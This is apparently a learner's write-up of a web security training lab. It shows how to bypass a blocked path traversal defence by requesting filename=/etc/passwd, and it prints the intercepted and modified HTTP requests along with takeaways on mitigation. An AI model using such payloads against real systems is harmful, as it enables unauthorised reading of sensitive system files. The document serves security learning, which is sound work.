
## Lab : File path traversal, traversal sequences blocked with absolute path bypass

Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.

If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.

You might be able to use an absolute path from the filesystem root, such as filename=/etc/passwd, to directly reference a file without using any traversal sequences.

## Write-up:

1) I am finally getting this concept.
2) Last time we used ../../, which is known as traversal sequence,  Now for this lab, just repeat the  last Labs process.
3) I opened Burp-suite and immediately launched the browser in the **proxy** tab.
4) I pasted the Lab's link and intercepted it .
5) Then i chose a GET request : 

```Request in Proxy
GET /image?filename=13.jpg HTTP/2
Host: 0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net
Cookie: session=fCnHEMGVGwXaQOOsbF49ze5ZLWYQa8xX
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

6) Then I sent that **GET Request** to the repeater for tweaking it a bit. This time, since we cant use traversal sequence, as it seems the developers blocked it, we still have a way to bypass the absolute path. Here is what i changed:


```Request in Repeater
GET /image?filename=/etc/passwd HTTP/2
Host: 0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net
Cookie: session=fCnHEMGVGwXaQOOsbF49ze5ZLWYQa8xX
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

7) I successfully exploited the vulnerability.


### ***Key Takeaways:**

- **Path Traversal Defense Bypass:** The lab demonstrated that even when traversal sequences are blocked, absolute paths can be used as a method to bypass restrictions.

- **Sensitive File Access:** Using absolute paths such as `/etc/passwd` can reveal sensitive information, which could potentially lead to further exploitation.

### ***Future Considerations:***

- When dealing with file upload or file inclusion features, always test for both traversal sequences and absolute path bypass methods.

- Developers can mitigate such vulnerabilities by using robust whitelisting or sanitization techniques for file paths (e.g., only allowing specific directories or files).

